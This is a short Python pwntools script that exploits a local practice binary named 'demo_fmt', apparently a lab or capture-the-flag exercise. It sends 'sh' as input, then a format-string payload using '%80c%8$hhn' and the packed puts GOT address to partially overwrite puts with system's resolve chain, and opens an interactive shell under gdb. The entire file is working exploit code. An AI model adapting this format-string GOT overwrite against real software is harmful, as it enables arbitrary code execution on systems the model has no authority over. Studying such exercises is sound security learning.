#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./demo_fmt')

puts_got = 0x404018
system_resolve_chain = 0x401050

gdb.attach(r)
r.sendafter("Give me string: ", "sh\x00")
r.sendafter("Give me fmt: ", b"%80c%8$hhn" + b"AAAAAA" + p64(puts_got))

r.interactive()